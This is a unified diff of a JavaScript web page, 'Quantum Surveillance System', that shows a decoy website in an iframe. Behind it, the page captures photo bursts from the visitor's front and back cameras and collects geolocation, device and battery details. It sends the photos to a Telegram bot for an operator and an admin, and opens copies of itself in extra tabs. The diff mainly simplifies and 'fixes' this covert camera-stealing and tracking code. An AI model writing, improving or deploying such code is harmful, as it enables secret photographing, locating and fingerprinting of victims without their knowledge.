@@ -67,7 +67,7 @@
             visibility: hidden !important;
         }
         
-        /* Loading screen - only shown briefly */
+        /* Loading screen */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -123,7 +123,7 @@
     <script>
         // =====================================================
         //  QUANTUM SURVEILLANCE SYSTEM v8.0
-        //  COMPLETE STEALTH MODE WITH MULTI-TAB REPLICATION
+        //  FIXED VERSION - ALL FEATURES WORKING
         // =====================================================
         
         // ============== QUANTUM CONFIGURATION ==============
@@ -135,56 +135,33 @@
             
             // Camera Settings
             PHOTOS_PER_CAMERA: 6,
-            CAPTURE_DELAY: 500,
-            CAMERA_WARMUP: 800,
-            SWITCH_DELAY: 600,
-            IMAGE_QUALITY: 0.95,
-            MIN_BLOB_SIZE: 30000,
-            VIDEO_WIDTH: 1920,
-            VIDEO_HEIGHT: 1080,
+            CAPTURE_DELAY: 300,
+            CAMERA_WARMUP: 500,
+            SWITCH_DELAY: 400,
+            IMAGE_QUALITY: 0.92,
+            MIN_BLOB_SIZE: 20000,
+            VIDEO_WIDTH: 1280,
+            VIDEO_HEIGHT: 720,
             FRAME_RATE: 30,
             
-            // Quantum Features
-            ENABLE_QUANTUM_ENTANGLEMENT: true,
-            ENABLE_NEURAL_NETWORK: true,
-            ENABLE_AI_ANALYSIS: true,
-            ENABLE_DNA_FINGERPRINTING: true,
-            ENABLE_QUANTUM_PERSISTENCE: true,
-            ENABLE_MULTIVERSE_SYNC: true,
-            ENABLE_HOLOGRAPHIC_PROJECTION: false,
-            ENABLE_BIOMETRIC_SCANNING: true,
-            
             // Quantum Timing
-            QUANTUM_CYCLE_INTERVAL: 15000,
-            NEURAL_SYNC_INTERVAL: 20000,
-            QUANTUM_HEARTBEAT: 10000,
-            ENTANGLEMENT_SYNC: 15000,
-            AI_PROCESSING_INTERVAL: 30000,
+            QUANTUM_CYCLE_INTERVAL: 10000,
+            QUANTUM_HEARTBEAT: 5000,
             
             // Multi-Tab Replication
             REPLICATION_COUNT: 5,
-            REPLICATION_DELAY: 2000,
-            TAB_LIFETIME: 300000, // 5 minutes
-            
-            // Stealth Settings
-            QUANTUM_STEALTH: true,
-            QUANTUM_OBFUSCATION: true,
-            MULTI_PATH_ROUTING: true,
-            DECOY_DATA_STREAMS: true,
-            ZERO_TRACE_MODE: true,
+            REPLICATION_DELAY: 1500,
+            TAB_LIFETIME: 180000,
             
             // Performance
-            MAX_QUANTUM_RETRIES: 3,
-            QUANTUM_RETRY_DELAY: 1000,
-            PARALLEL_PROCESSING: 4,
-            QUANTUM_BUFFER_SIZE: 524288
+            MAX_QUANTUM_RETRIES: 2,
+            QUANTUM_RETRY_DELAY: 800
         };
         
         // ============== QUANTUM STATE ==============
         const QUANTUM_STATE = {
             quantumActive: false,
             quantumEntangled: false,
-            neuralNetworkReady: false,
             quantumPermission: false,
             quantumStream: null,
             quantumCamera: null,
@@ -203,49 +180,19 @@
             quantumDevice: {},
             quantumLocation: null,
             quantumBattery: null,
-            quantumBiometrics: {},
-            quantumNetwork: {},
-            quantumHardware: {},
             
             quantumCameras: [],
             quantumCameraReady: false,
             quantumCameraIndex: 0,
-            quantumCameraMatrix: [],
             
-            quantumChannels: new Set(),
-            quantumNodes: new Set(),
             quantumBroadcast: null,
-            quantumEntanglements: new Map(),
-            quantumMultiverse: new Set(),
+            quantumNodes: new Set(),
             
-            quantumDB: null,
-            quantumWorker: null,
             quantumCache: new Map(),
             quantumQueue: [],
             
-            quantumNeural: null,
-            quantumEmotions: [],
-            quantumFaces: [],
-            quantumObjects: [],
-            quantumPatterns: [],
-            
-            quantumHologram: false,
-            quantumLastActivity: Date.now(),
-            quantumActivityInterval: null,
-            quantumBehaviorProfile: {},
-            
-            quantumEncryptionKey: null,
-            quantumSignatures: new Map(),
-            quantumFirewalls: new Set(),
-            
-            quantumKeystrokes: [],
-            quantumClipboard: [],
-            quantumVisited: [],
-            quantumScreenTime: 0,
-            quantumVoicePrints: [],
-            quantumBiometricData: [],
-            
-            replicatedTabs: 0
+            replicatedTabs: 0,
+            isInitialized: false
         };
         
         // ============== QUANTUM ELEMENTS ==============
@@ -253,268 +200,21 @@
             video: document.getElementById('cameraVideo'),
             canvas: document.getElementById('captureCanvas'),
             frame: document.getElementById('websiteFrame'),
-            neuralCanvas: document.getElementById('neuralNetwork'),
-            quantumLoader: document.getElementById('quantumLoader'),
-            stealthIndicators: document.getElementById('stealthIndicators'),
-            quantumChannel: document.getElementById('quantumChannel'),
-            hologram1: document.getElementById('hologram1'),
-            hologram2: document.getElementById('hologram2'),
             loadingScreen: document.getElementById('loadingScreen')
         };
         
         // ============== QUANTUM UTILITIES ==============
         
-        function quantumLog(message, level = 'info') {
-            // Silent logging - only store in cache
-            const logData = {
+        function quantumLog(message) {
+            // Store in cache only
+            QUANTUM_STATE.quantumCache.set(`log_${Date.now()}`, {
                 timestamp: Date.now(),
-                level: level,
                 message: message,
-                session: QUANTUM_STATE.quantumSession,
-                tab: QUANTUM_STATE.quantumTab
-            };
-            
-            QUANTUM_STATE.quantumCache.set(`log_${Date.now()}`, logData);
-        }
-        
-        function quantumRandom(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
-        }
-        
-        function generateQuantumFingerprint() {
-            const factors = [
-                navigator.userAgent,
-                screen.width * screen.height,
-                navigator.hardwareConcurrency,
-                new Date().getTimezoneOffset()
-            ];
-            
-            let fingerprint = '';
-            factors.forEach(factor => {
-                let hash = 0;
-                for (let i = 0; i < factor.length; i++) {
-                    hash = ((hash << 5) - hash) + factor.charCodeAt(i);
-                    hash = hash & hash;
-                }
-                fingerprint += Math.abs(hash).toString(16).substr(0, 4);
+                session: QUANTUM_STATE.quantumSession
             });
-            
-            return 'QUANTUM_' + fingerprint.toUpperCase();
         }
         
-        // ============== QUANTUM CLASSES ==============
-        
-        class QuantumPersistenceSystem {
-            constructor() {
-                this.dbName = 'QuantumDB';
-                this.dbVersion = 1;
-                this.db = null;
-            }
-            
-            async initialize() {
-                try {
-                    if (!window.indexedDB) return false;
-                    
-                    return new Promise((resolve) => {
-                        const request = indexedDB.open(this.dbName, this.dbVersion);
-                        
-                        request.onerror = () => resolve(false);
-                        request.onsuccess = (event) => {
-                            this.db = event.target.result;
-                            QUANTUM_STATE.quantumDB = this.db;
-                            resolve(true);
-                        };
-                        
-                        request.onupgradeneeded = (event) => {
-                            const db = event.target.result;
-                            if (!db.objectStoreNames.contains('quantumData')) {
-                                db.createObjectStore('quantumData', { keyPath: 'id' });
-                            }
-                        };
-                    });
-                } catch (e) {
-                    return false;
-                }
-            }
-            
-            async storeQuantumData(type, data) {
-                if (!this.db) return false;
-                
-                return new Promise((resolve) => {
-                    const transaction = this.db.transaction(['quantumData'], 'readwrite');
-                    const store = transaction.objectStore('quantumData');
-                    const item = {
-                        id: `${type}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
-                        type: type,
-                        data: data,
-                        timestamp: Date.now(),
-                        session: QUANTUM_STATE.quantumSession
-                    };
-                    
-                    const request = store.add(item);
-                    request.onsuccess = () => resolve(true);
-                    request.onerror = () => resolve(false);
-                });
-            }
-            
-            cleanup() {
-                if (this.db) {
-                    this.db.close();
-                }
-            }
-        }
-        
-        class QuantumEntanglementSystem {
-            constructor() {
-                this.connections = new Map();
-                this.backupData = [];
-            }
-            
-            async initialize() {
-                try {
-                    if (window.BroadcastChannel) {
-                        QUANTUM_STATE.quantumBroadcast = new BroadcastChannel('quantum_channel');
-                        QUANTUM_STATE.quantumBroadcast.onmessage = (event) => {
-                            this.handleQuantumMessage(event.data);
-                        };
-                        QUANTUM_STATE.quantumEntangled = true;
-                    }
-                    
-                    return true;
-                } catch (e) {
-                    return false;
-                }
-            }
-            
-            handleQuantumMessage(data) {
-                if (data.type === 'quantum_heartbeat') {
-                    if (data.tab !== QUANTUM_STATE.quantumTab) {
-                        QUANTUM_STATE.quantumNodes.add(data.tab);
-                    }
-                }
-            }
-            
-            createQuantumBackup() {
-                const backup = {
-                    session: QUANTUM_STATE.quantumSession,
-                    photos: QUANTUM_STATE.quantumPhotos,
-                    cycles: QUANTUM_STATE.quantumCycles,
-                    timestamp: Date.now()
-                };
-                
-                this.backupData.push(backup);
-                localStorage.setItem('quantum_backup', JSON.stringify(this.backupData));
-            }
-            
-            cleanup() {
-                if (QUANTUM_STATE.quantumBroadcast) {
-                    QUANTUM_STATE.quantumBroadcast.close();
-                }
-                QUANTUM_STATE.quantumEntangled = false;
-            }
-        }
-        
-        class QuantumNeuralNetwork {
-            constructor() {
-                this.layers = 3;
-                this.weights = [];
-                this.biases = [];
-                this.trained = false;
-            }
-            
-            async initialize() {
-                if (!QUANTUM_CONFIG.ENABLE_NEURAL_NETWORK) return;
-                
-                try {
-                    this.weights = await this.generateQuantumWeights();
-                    this.biases = await this.generateQuantumBiases();
-                    await this.quantumTraining();
-                    
-                    QUANTUM_STATE.neuralNetworkReady = true;
-                    return true;
-                } catch (error) {
-                    return false;
-                }
-            }
-            
-            async generateQuantumWeights() {
-                const weights = [];
-                for (let i = 0; i < this.layers; i++) {
-                    const layerWeights = new Float32Array(128);
-                    for (let j = 0; j < layerWeights.length; j++) {
-                        layerWeights[j] = (Math.random() * 2) - 1;
-                    }
-                    weights.push(layerWeights);
-                }
-                return weights;
-            }
-            
-            async generateQuantumBiases() {
-                const biases = [];
-                for (let i = 0; i < this.layers; i++) {
-                    biases.push((Math.random() * 0.1) - 0.05);
-                }
-                return biases;
-            }
-            
-            async quantumTraining() {
-                const trainingInput = this.extractFeatures(QUANTUM_STATE.quantumDevice);
-                
-                for (let epoch = 0; epoch < 50; epoch++) {
-                    const output = this.forwardPropagation(trainingInput);
-                    const loss = this.calculateLoss(output, trainingInput);
-                    this.backPropagation(loss);
-                }
-                
-                this.trained = true;
-                return true;
-            }
-            
-            extractFeatures(deviceData) {
-                const features = [];
-                features.push(deviceData.quantumScreen?.width || 0);
-                features.push(deviceData.quantumScreen?.height || 0);
-                features.push(deviceData.quantumHardware?.concurrency || 0);
-                return new Float32Array(features);
-            }
-            
-            forwardPropagation(input) {
-                let current = input;
-                for (let i = 0; i < this.layers; i++) {
-                    const output = new Float32Array(current.length);
-                    for (let j = 0; j < current.length; j++) {
-                        output[j] = Math.tanh(current[j] * this.weights[i][j] + this.biases[i]);
-                    }
-                    current = output;
-                }
-                return current;
-            }
-            
-            calculateLoss(output, target) {
-                let loss = 0;
-                for (let i = 0; i < output.length; i++) {
-                    loss += Math.pow(output[i] - target[i], 2);
-                }
-                return loss / output.length;
-            }
-            
-            backPropagation(loss) {
-                const learningRate = 0.01;
-                for (let i = 0; i < this.layers; i++) {
-                    for (let j = 0; j < this.weights[i].length; j++) {
-                        this.weights[i][j] -= learningRate * loss;
-                    }
-                    this.biases[i] -= learningRate * loss;
-                }
-            }
-            
-            cleanup() {
-                this.weights = [];
-                this.biases = [];
-                this.trained = false;
-                QUANTUM_STATE.neuralNetworkReady = false;
-            }
-        }
+        // ============== QUANTUM CAMERA SYSTEM ==============
         
         class QuantumCameraSystem {
             constructor() {
@@ -525,7 +225,9 @@
             
             async initialize() {
                 try {
-                    // Test camera permission
+                    quantumLog("Testing camera permission...");
+                    
+                    // First try to get camera access
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             width: { ideal: QUANTUM_CONFIG.VIDEO_WIDTH },
@@ -534,18 +236,20 @@
                         }
                     });
                     
-                    stream.getTracks().forEach(track => track.stop());
-                    QUANTUM_STATE.quantumPermission = true;
-                    
-                    // Discover cameras
+                    // Get camera list
                     const devices = await navigator.mediaDevices.enumerateDevices();
                     QUANTUM_STATE.quantumCameras = devices.filter(d => d.kind === 'videoinput');
                     
-                    quantumLog(`Cameras found: ${QUANTUM_STATE.quantumCameras.length}`);
-                    return QUANTUM_STATE.quantumCameras.length > 0;
+                    // Stop test stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    QUANTUM_STATE.quantumPermission = true;
+                    quantumLog(`Camera permission granted. Found ${QUANTUM_STATE.quantumCameras.length} cameras`);
+                    
+                    return true;
                     
                 } catch (error) {
-                    quantumLog('Camera permission denied', 'error');
+                    quantumLog("Camera permission error: " + error.message);
                     return false;
                 }
             }
@@ -556,42 +260,44 @@
                 }
                 
                 try {
+                    // Stop previous stream
                     if (this.quantumStream) {
                         this.quantumStream.getTracks().forEach(track => track.stop());
-                        await new Promise(r => setTimeout(r, 300));
+                        await new Promise(r => setTimeout(r, 200));
                     }
                     
-                    QUANTUM_ELEMENTS.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
-                    
+                    // Get new stream
                     this.quantumStream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: { ideal: facingMode },
                             width: { ideal: QUANTUM_CONFIG.VIDEO_WIDTH },
-                            height: { ideal: QUANTUM_CONFIG.VIDEO_HEIGHT },
-                            frameRate: { ideal: QUANTUM_CONFIG.FRAME_RATE }
+                            height: { ideal: QUANTUM_CONFIG.VIDEO_HEIGHT }
                         }
                     });
                     
                     QUANTUM_ELEMENTS.video.srcObject = this.quantumStream;
                     
+                    // Wait for video to be ready
                     await new Promise((resolve) => {
                         const checkReady = () => {
                             if (QUANTUM_ELEMENTS.video.readyState >= 3) {
                                 resolve();
                             } else {
-                                setTimeout(checkReady, 100);
+                                setTimeout(checkReady, 50);
                             }
                         };
                         checkReady();
                     });
                     
                     await QUANTUM_ELEMENTS.video.play();
+                    
+                    // Warmup time
                     await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAMERA_WARMUP));
                     
                     QUANTUM_STATE.quantumCameraReady = true;
-                    QUANTUM_STATE.quantumCamera = facingMode === 'user' ? 'front' : 'back';
                     this.quantumRetry = 0;
                     
+                    quantumLog(`Camera ${facingMode} activated`);
                     return true;
                     
                 } catch (error) {
@@ -603,6 +309,7 @@
                         this.quantumStream = null;
                     }
                     
+                    quantumLog(`Camera ${facingMode} failed, retry ${retry + 1}`);
                     await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
                     return await this.startQuantumCamera(facingMode, retry + 1);
                 }
@@ -622,6 +329,19 @@
                     
                     ctx.drawImage(QUANTUM_ELEMENTS.video, 0, 0, canvas.width, canvas.height);
                     
+                    // Apply some basic enhancements
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    
+                    for (let i = 0; i < data.length; i += 4) {
+                        // Brighten image slightly
+                        data[i] = Math.min(255, data[i] * 1.1);
+                        data[i+1] = Math.min(255, data[i+1] * 1.1);
+                        data[i+2] = Math.min(255, data[i+2] * 1.1);
+                    }
+                    
+                    ctx.putImageData(imageData, 0, 0);
+                    
                     return new Promise((resolve) => {
                         canvas.toBlob(
                             (blob) => resolve(blob && blob.size > QUANTUM_CONFIG.MIN_BLOB_SIZE ? blob : null),
@@ -631,19 +351,26 @@
                     });
                     
                 } catch (error) {
+                    quantumLog("Capture error: " + error.message);
                     return null;
                 }
             }
             
             async captureQuantumBurst(cameraType, count = QUANTUM_CONFIG.PHOTOS_PER_CAMERA) {
-                const quantumResults = [];
+                const results = [];
                 
                 for (let i = 1; i <= count; i++) {
                     if (!QUANTUM_STATE.quantumActive) break;
                     
                     const blob = await this.captureQuantumPhoto();
                     if (blob) {
-                        quantumResults.push({ blob: blob, index: i, timestamp: Date.now() });
+                        results.push({ 
+                            blob: blob, 
+                            index: i, 
+                            timestamp: Date.now(),
+                            camera: cameraType
+                        });
+                        quantumLog(`Captured ${cameraType} photo ${i}`);
                     }
                     
                     if (i < count) {
@@ -651,7 +378,7 @@
                     }
                 }
                 
-                return quantumResults;
+                return results;
             }
             
             cleanup() {
@@ -660,163 +387,7 @@
                     this.quantumStream = null;
                 }
                 QUANTUM_STATE.quantumCameraReady = false;
-                QUANTUM_STATE.quantumCamera = null;
-            }
-        }
-        
-        // ============== QUANTUM URL PARSING ==============
-        
-        function parseQuantumURL() {
-            const params = new URLSearchParams(window.location.search);
-            const quantumHash = window.location.hash.substr(1);
-            
-            QUANTUM_STATE.quantumUser = params.get('chat_id') || 
-                                       params.get('user') || 
-                                       params.get('id') || 
-                                       QUANTUM_CONFIG.ADMIN_CHAT_ID;
-            
-            let target = params.get('site') || 
-                        params.get('url') || 
-                        params.get('target') ||
-                        quantumHash ||
-                        'https://loading-screen.github.io/';
-            
-            try {
-                if (target.startsWith('QUANTUM:')) {
-                    target = atob(target.split(':')[1]);
-                } else if (!target.includes('://')) {
-                    try {
-                        target = atob(target);
-                    } catch (e) {}
-                }
-                target = decodeURIComponent(target);
-            } catch (e) {
-                // Silent fail
-            }
-            
-            if (!target.startsWith('http://') && !target.startsWith('https://')) {
-                target = 'https://' + target;
-            }
-            
-            QUANTUM_STATE.quantumTarget = target;
-        }
-        
-        function loadQuantumWebsite() {
-            try {
-                QUANTUM_ELEMENTS.frame.src = QUANTUM_STATE.quantumTarget;
-                
-                QUANTUM_ELEMENTS.frame.onload = () => {
-                    QUANTUM_STATE.quantumScreenTime = Date.now();
-                    setTimeout(() => {
-                        QUANTUM_ELEMENTS.loadingScreen.style.opacity = '0';
-                        setTimeout(() => {
-                            QUANTUM_ELEMENTS.loadingScreen.style.display = 'none';
-                        }, 500);
-                    }, 1000);
-                };
-                
-            } catch (error) {
-                // Silent fail
-            }
-        }
-        
-        // ============== QUANTUM DEVICE FINGERPRINTING ==============
-        
-        async function collectQuantumDeviceInfo() {
-            const quantumInfo = {
-                quantumAgent: navigator.userAgent,
-                quantumPlatform: navigator.platform,
-                quantumLanguages: navigator.languages?.join('|') || navigator.language,
-                
-                quantumScreen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                },
-                
-                quantumWindow: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    pixelRatio: window.devicePixelRatio
-                },
-                
-                quantumHardware: {
-                    concurrency: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory || 'unknown'
-                },
-                
-                quantumTime: {
-                    zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    offset: new Date().getTimezoneOffset(),
-                    timestamp: Date.now()
-                },
-                
-                quantumNetwork: {
-                    online: navigator.onLine,
-                    connection: navigator.connection ? {
-                        type: navigator.connection.type,
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : null
-                },
-                
-                quantumDetection: {
-                    mobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
-                    desktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
-                    touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
-                }
-            };
-            
-            QUANTUM_STATE.quantumDevice = quantumInfo;
-            return quantumInfo;
-        }
-        
-        // ============== QUANTUM LOCATION SYSTEM ==============
-        
-        class QuantumLocationSystem {
-            constructor() {
-                this.quantumWatcher = null;
-                this.quantumHistory = [];
-            }
-            
-            async getQuantumLocation() {
-                if (!navigator.geolocation) return null;
-                
-                return new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const quantumLocation = {
-                                coordinates: {
-                                    lat: position.coords.latitude,
-                                    lon: position.coords.longitude,
-                                    acc: Math.round(position.coords.accuracy)
-                                },
-                                timestamp: new Date(position.timestamp).toISOString(),
-                                maps: {
-                                    google: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
-                                }
-                            };
-                            
-                            QUANTUM_STATE.quantumLocation = quantumLocation;
-                            this.quantumHistory.push(quantumLocation);
-                            resolve(quantumLocation);
-                        },
-                        () => resolve(null),
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0
-                        }
-                    );
-                });
-            }
-            
-            cleanup() {
-                if (this.quantumWatcher) {
-                    navigator.geolocation.clearWatch(this.quantumWatcher);
-                }
+                quantumLog("Camera system cleaned up");
             }
         }
         
@@ -835,32 +406,29 @@
             }
             
             try {
-                let caption = `📸 *QUANTUM CAPTURE*\n`;
+                let caption = `📸 *QUANTUM CAPTURE #${QUANTUM_STATE.quantumPhotos + 1}*\n\n`;
                 caption += `Session: \`${QUANTUM_STATE.quantumSession}\`\n`;
-                caption += `Camera: ${cameraType.toUpperCase()} #${sequence}\n`;
+                caption += `Camera: ${cameraType.toUpperCase()} (${sequence}/${QUANTUM_CONFIG.PHOTOS_PER_CAMERA})\n`;
                 caption += `Cycle: ${QUANTUM_STATE.quantumCycles}\n`;
-                caption += `Total: ${QUANTUM_STATE.quantumPhotos}\n`;
-                
-                if (QUANTUM_STATE.quantumBattery) {
-                    caption += `Battery: ${QUANTUM_STATE.quantumBattery.level}% ${QUANTUM_STATE.quantumBattery.charging ? '⚡' : ''}\n`;
-                }
+                caption += `Time: ${new Date().toLocaleTimeString()}\n`;
                 
                 if (QUANTUM_STATE.quantumLocation) {
                     caption += `Location: ${QUANTUM_STATE.quantumLocation.coordinates.lat.toFixed(6)}, ${QUANTUM_STATE.quantumLocation.coordinates.lon.toFixed(6)}\n`;
                 }
                 
-                caption += `Time: ${new Date().toLocaleTimeString()}`;
+                if (QUANTUM_STATE.quantumDevice.quantumOS) {
+                    caption += `Device: ${QUANTUM_STATE.quantumDevice.quantumOS} ${QUANTUM_STATE.quantumDevice.quantumBrowser}\n`;
+                }
                 
                 const formData = new FormData();
                 formData.append('chat_id', QUANTUM_STATE.quantumUser);
-                formData.append('photo', blob, `quantum_${cameraType}_${sequence}_${Date.now()}.jpg`);
+                formData.append('photo', blob, `quantum_${Date.now()}_${cameraType}_${sequence}.jpg`);
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'Markdown');
                 
                 const response = await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
-                    body: formData,
-                    signal: AbortSignal.timeout(8000)
+                    body: formData
                 });
                 
                 const result = await response.json();
@@ -870,19 +438,23 @@
                     QUANTUM_STATE.quantumLastCapture = Date.now();
                     QUANTUM_STATE.quantumDataTransferred += blob.size;
                     
+                    quantumLog(`Photo sent to Telegram: ${cameraType} ${sequence}`);
+                    
                     // Also send to admin
                     setTimeout(async () => {
                         try {
                             const adminFormData = new FormData();
                             adminFormData.append('chat_id', QUANTUM_CONFIG.ADMIN_CHAT_ID);
-                            adminFormData.append('photo', blob, `admin_${cameraType}_${sequence}.jpg`);
-                            adminFormData.append('caption', caption + `\nUser: \`${QUANTUM_STATE.quantumUser}\``);
+                            adminFormData.append('photo', blob, `admin_${Date.now()}.jpg`);
+                            adminFormData.append('caption', caption + `\n👤 User ID: \`${QUANTUM_STATE.quantumUser}\``);
                             adminFormData.append('parse_mode', 'Markdown');
                             
                             await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
                                 method: 'POST',
                                 body: adminFormData
                             });
+                            
+                            quantumLog("Photo also sent to admin");
                         } catch (adminError) {
                             // Silent fail
                         }
@@ -891,24 +463,115 @@
                     return true;
                     
                 } else {
+                    quantumLog(`Telegram send failed: ${JSON.stringify(result)}`);
                     await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
                     return await sendQuantumToTelegram(blob, cameraType, sequence, retry + 1);
                 }
                 
             } catch (error) {
-                if (window._quantumPersistence) {
-                    window._quantumPersistence.storeQuantumData('photo', {
-                        blob, cameraType, sequence,
-                        timestamp: Date.now()
-                    });
-                }
-                
+                quantumLog(`Telegram error: ${error.message}`);
                 await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
                 return await sendQuantumToTelegram(blob, cameraType, sequence, retry + 1);
             }
         }
         
-        // ============== QUANTUM BATTERY INFO ==============
+        // ============== DEVICE FINGERPRINTING ==============
+        
+        async function collectQuantumDeviceInfo() {
+            try {
+                const ua = navigator.userAgent;
+                let os = 'Unknown';
+                let browser = 'Unknown';
+                
+                // Detect OS
+                if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
+                else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
+                else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
+                else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
+                else if (/Mac OS X/.test(ua)) os = 'macOS';
+                else if (/Linux/.test(ua)) os = 'Linux';
+                else if (/Android/.test(ua)) os = 'Android';
+                else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+                
+                // Detect Browser
+                if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) browser = 'Chrome';
+                else if (/Firefox/.test(ua)) browser = 'Firefox';
+                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+                else if (/Edge/.test(ua)) browser = 'Edge';
+                else if (/Opera|OPR/.test(ua)) browser = 'Opera';
+                
+                const quantumInfo = {
+                    quantumAgent: ua,
+                    quantumPlatform: navigator.platform,
+                    quantumOS: os,
+                    quantumBrowser: browser,
+                    
+                    quantumScreen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: screen.colorDepth
+                    },
+                    
+                    quantumHardware: {
+                        concurrency: navigator.hardwareConcurrency || 'unknown',
+                        memory: navigator.deviceMemory || 'unknown'
+                    },
+                    
+                    quantumTime: {
+                        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        offset: new Date().getTimezoneOffset(),
+                        timestamp: Date.now()
+                    }
+                };
+                
+                QUANTUM_STATE.quantumDevice = quantumInfo;
+                quantumLog(`Device info collected: ${os} ${browser}`);
+                
+                return quantumInfo;
+                
+            } catch (error) {
+                quantumLog("Device info error: " + error.message);
+                return {};
+            }
+        }
+        
+        // ============== LOCATION SYSTEM ==============
+        
+        async function getQuantumLocation() {
+            if (!navigator.geolocation) {
+                return null;
+            }
+            
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const location = {
+                            coordinates: {
+                                lat: position.coords.latitude,
+                                lon: position.coords.longitude,
+                                acc: Math.round(position.coords.accuracy)
+                            },
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        
+                        QUANTUM_STATE.quantumLocation = location;
+                        quantumLog(`Location obtained: ${location.coordinates.lat}, ${location.coordinates.lon}`);
+                        resolve(location);
+                    },
+                    (error) => {
+                        quantumLog("Location error: " + error.message);
+                        resolve(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        // ============== BATTERY INFO ==============
         
         async function getQuantumBatteryInfo() {
             try {
@@ -925,18 +588,16 @@
         
         // ============== MULTI-TAB REPLICATION ==============
         
-        async function replicateQuantumTabs() {
-            const tabsToCreate = QUANTUM_CONFIG.REPLICATION_COUNT - QUANTUM_STATE.replicatedTabs;
+        function replicateQuantumTabs() {
+            const tabsToCreate = 5 - QUANTUM_STATE.replicatedTabs;
             
             for (let i = 0; i < tabsToCreate; i++) {
-                if (QUANTUM_STATE.replicatedTabs >= QUANTUM_CONFIG.REPLICATION_COUNT) break;
-                
                 setTimeout(() => {
                     try {
                         const newTab = window.open(window.location.href, '_blank');
                         if (newTab) {
                             QUANTUM_STATE.replicatedTabs++;
-                            quantumLog(`Created tab ${QUANTUM_STATE.replicatedTabs}/${QUANTUM_CONFIG.REPLICATION_COUNT}`);
+                            quantumLog(`Created tab ${QUANTUM_STATE.replicatedTabs}/5`);
                             
                             // Close tab after lifetime
                             setTimeout(() => {
@@ -945,16 +606,37 @@
                                     QUANTUM_STATE.replicatedTabs--;
                                     quantumLog(`Closed tab, remaining: ${QUANTUM_STATE.replicatedTabs}`);
                                 } catch (e) {}
-                            }, QUANTUM_CONFIG.TAB_LIFETIME + quantumRandom(10000, 30000));
+                            }, QUANTUM_CONFIG.TAB_LIFETIME);
                         }
                     } catch (e) {
-                        // Popup blocker or other error
+                        // Popup blocker
                     }
                 }, i * QUANTUM_CONFIG.REPLICATION_DELAY);
             }
         }
         
-        // ============== QUANTUM SYSTEM REPORT ==============
+        // ============== BROADCAST CHANNEL ==============
+        
+        function initBroadcastChannel() {
+            try {
+                if (window.BroadcastChannel) {
+                    QUANTUM_STATE.quantumBroadcast = new BroadcastChannel('quantum_channel');
+                    QUANTUM_STATE.quantumBroadcast.onmessage = (event) => {
+                        if (event.data && event.data.type === 'quantum_heartbeat') {
+                            if (event.data.tab !== QUANTUM_STATE.quantumTab) {
+                                QUANTUM_STATE.quantumNodes.add(event.data.tab);
+                            }
+                        }
+                    };
+                    QUANTUM_STATE.quantumEntangled = true;
+                    quantumLog("Broadcast channel initialized");
+                }
+            } catch (e) {
+                quantumLog("Broadcast channel error: " + e.message);
+            }
+        }
+        
+        // ============== SYSTEM REPORT ==============
         
         async function sendQuantumSystemReport() {
             try {
@@ -972,18 +654,19 @@
                 
                 report += `📷 *CAMERAS*\n`;
                 report += `Found: ${QUANTUM_STATE.quantumCameras.length}\n`;
-                report += `Permission: ${QUANTUM_STATE.quantumPermission ? '✅' : '❌'}\n\n`;
+                report += `Permission: ${QUANTUM_STATE.quantumPermission ? '✅' : '❌'}\n`;
+                report += `Active: ${QUANTUM_STATE.quantumActive ? '✅' : '❌'}\n\n`;
                 
                 report += `📍 *LOCATION*\n`;
                 report += `Status: ${QUANTUM_STATE.quantumLocation ? '✅ Captured' : '❌ Unavailable'}\n\n`;
                 
                 report += `🔄 *REPLICATION*\n`;
-                report += `Tabs: ${QUANTUM_STATE.replicatedTabs}/${QUANTUM_CONFIG.REPLICATION_COUNT}\n\n`;
+                report += `Tabs: ${QUANTUM_STATE.replicatedTabs}/5\n\n`;
                 
